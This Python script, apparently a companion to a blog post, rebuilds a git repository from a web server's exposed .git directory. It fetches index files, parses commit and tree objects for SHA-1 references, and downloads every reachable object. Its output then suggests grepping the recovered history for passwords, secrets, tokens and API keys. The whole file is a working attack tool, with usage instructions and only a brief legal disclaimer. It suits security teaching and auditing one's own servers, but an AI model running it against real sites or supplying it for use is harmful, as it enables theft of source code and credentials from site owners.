#!/usr/bin/env python3
"""
git-dump.py — Reconstruct a git repository from an exposed .git/ directory
served over plain HTTP.

Companion script to:
  https://techearl.com/exposed-git-directory-attack

Usage:
  python3 git-dump.py <target-url> <output-dir>

Example:
  python3 git-dump.py http://localhost:8888/wp-content/uploads ./dumped

Strategy (lightweight, dependency-free):
  1. Fetch the well-known .git/ index files (HEAD, config, refs/*, packed-refs,
     logs/HEAD, info/refs, objects/info/packs).
  2. Parse them for every SHA-1 they reference.
  3. For each SHA-1, fetch .git/objects/aa/bbbb... (loose objects) and any
     pack files referenced from objects/info/packs.
  4. Walk newly-fetched commit/tree objects to discover further SHAs, repeat
     until the queue is empty.
  5. Hand the resulting directory to a real `git` binary for inspection:
       cd dumped && git log --all -p

This is intentionally simpler than tools like `git-dumper` and `GitTools/Dumper`
— it does not try to brute-force common filenames, and it relies on the standard
library only (no aiohttp, no concurrent.futures). The point is to show how the
attack works end-to-end in ~150 lines, not to replace those tools in a real
engagement.

Legal: only run this against systems you own or have written permission to test.
"""
from __future__ import annotations

import os
import re
import sys
import zlib
import urllib.request
import urllib.error
from pathlib import Path

UA = "git-dumper-edu/1.0 (+https://techearl.com/exposed-git-directory-attack)"
SHA_RE = re.compile(rb"\b[0-9a-f]{40}\b")
TIMEOUT = 15

# Files that almost always exist in a real .git/ directory and tell us about
# refs and pack files. Worth fetching unconditionally before we start walking
# objects.
KNOWN_FILES = [
    "HEAD",
    "config",
    "description",
    "info/refs",
    "info/exclude",
    "objects/info/packs",
    "packed-refs",
    "logs/HEAD",
    "FETCH_HEAD",
    "ORIG_HEAD",
    "refs/heads/main",
    "refs/heads/master",
    "refs/heads/develop",
    "refs/remotes/origin/HEAD",
    "refs/remotes/origin/main",
    "refs/remotes/origin/master",
]


def fetch(url: str) -> bytes | None:
    """GET url, return bytes or None on 4xx/5xx/timeout."""
    req = urllib.request.Request(url, headers={"User-Agent": UA})
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as r:
            return r.read()
    except (urllib.error.HTTPError, urllib.error.URLError, TimeoutError):
        return None


def save(out_dir: Path, rel: str, data: bytes) -> Path:
    """Write data to out_dir/.git/rel, creating parents as needed."""
    path = out_dir / ".git" / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(data)
    return path


def shas_from(data: bytes) -> set[str]:
    """Extract SHA-1 references from data.

    Plain text refs (HEAD, packed-refs, logs/HEAD, etc.) and commit objects
    store SHA-1 as 40-char hex. Tree objects store SHA-1 as raw 20 binary
    bytes after the entry header: `<mode> <name>\\x00<20-byte-sha>`.
    We handle both."""
    out = {m.decode() for m in SHA_RE.findall(data)}

    # Tree-entry parser: object format starts with `tree <length>\x00`,
    # then repeating `<mode-octal> <filename>\x00<20-byte-sha>` entries.
    if data.startswith(b"tree "):
        i = data.index(b"\x00") + 1  # skip past the header
        while i < len(data):
            nul = data.find(b"\x00", i)
            if nul == -1 or nul + 20 > len(data):
                break
            sha_bytes = data[nul + 1 : nul + 21]
            out.add(sha_bytes.hex())
            i = nul + 21
    return out


def inflate(data: bytes) -> bytes:
    """Loose objects are stored zlib-compressed. Return inflated payload or
    raw bytes if inflation fails."""
    try:
        return zlib.decompress(data)
    except zlib.error:
        return data


def object_url(base: str, sha: str) -> str:
    return f"{base}/.git/objects/{sha[:2]}/{sha[2:]}"


def main() -> int:
    if len(sys.argv) != 3:
        print(f"usage: {sys.argv[0]} <target-url> <output-dir>", file=sys.stderr)
        return 2

    base = sys.argv[1].rstrip("/")
    out_dir = Path(sys.argv[2])
    out_dir.mkdir(parents=True, exist_ok=True)

    queue: set[str] = set()
    seen: set[str] = set()

    # Phase 1: fetch known index files and seed the SHA queue from them.
    for rel in KNOWN_FILES:
        data = fetch(f"{base}/.git/{rel}")
        if data is None:
            continue
        save(out_dir, rel, data)
        queue |= shas_from(data)
        print(f"  fetched .git/{rel} ({len(data)} bytes)")

    # Phase 2: walk objects. Every fetched commit/tree references more SHAs.
    while queue:
        sha = queue.pop()
        if sha in seen:
            continue
        seen.add(sha)

        url = object_url(base, sha)
        data = fetch(url)
        if data is None:
            continue
        save(out_dir, f"objects/{sha[:2]}/{sha[2:]}", data)
        new_shas = shas_from(inflate(data)) - seen
        if new_shas:
            queue |= new_shas
        print(f"  fetched object {sha}  (queue: {len(queue)}, seen: {len(seen)})")

    print()
    print(f"Done. Fetched {len(seen)} objects.")
    print(f"Reconstructed repo at: {out_dir}")
    print()
    print("Next steps:")
    print(f"  cd {out_dir}")
    print("  git fsck --full           # check what's recoverable")
    print("  git log --all --oneline   # see all commits we now have")
    print("  git log --all -p          # walk full history with diffs")
    print("  git log --all -p | grep -iE 'password|secret|token|api_key'")
    return 0


if __name__ == "__main__":
    sys.exit(main())
